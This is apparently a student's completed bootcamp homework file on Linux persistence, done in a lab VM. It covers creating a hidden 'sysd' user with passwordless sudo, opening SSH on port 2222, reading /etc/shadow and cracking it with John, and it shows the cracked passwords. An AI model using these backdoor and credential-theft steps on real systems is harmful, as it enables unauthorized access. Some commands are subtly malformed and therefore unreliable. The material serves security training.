## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - ` adduser --no-create-home sysd`

2. Give your secret user a password: 
    - `passwd sysd`

3. Give your secret user a system UID < 1000:
    - `usermod -u 990 sysd`

4. Give your secret user the same GID:
   - `groupadd -g 990 sysd`

5. Give your secret user full `sudo` access without the need for a password:
   -  `sudo sh -c 'echo "sysd ALL=(ALL:ALL) NOPASSWD: ALL" > /etc/sudoers.d/sysd`
    OR
    'sudo visudo'

6. Test that `sudo` access works without your password:
    'sudo -l'
    OR
    ```bash
    sudo cat /etc/{gshadow,shadow,passwd}
    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:
# first, I nano'd to it 'nano /etc/ssh/sshd_config', then I uncommented Port 22 and I added Port 2222 below (see screenshot)
    ```bash 
     Port 2222
    ```


**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:

    - `service ssh restart`

2. Exit the `root` account:
    - 'exit' AND/OR 'ctrl + d'

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `ssh sysd@192.168.56.105 -p 2222`

4. Use `sudo` to switch to the root user:
    - `sudo -s`

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `ssh sysd@192.168.56.105 -p 2222`

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:
    # escalate privileges first
    - `sudo -s `
    # Use john to crack /etc/shadow
    # I copied the shadow file first, then I used john on the copied shadow file.
    - 'john /etc/shadow' 
    OR 'cp /etc/shadow > /etc/cracked_pw.txt'  then I entered 'john cracked_pw.txt'
The following output was displayed: 
"root@scavenger-hunt:/etc# john cracked_pw.txt 
Created directory: /root/.john
Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
computer         (stallman)
freedom          (babbage)
trustno1         (mitnik)
dragon           (lovelace)
lakers           (turing)
passw0rd         (sysadmin)
"
---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

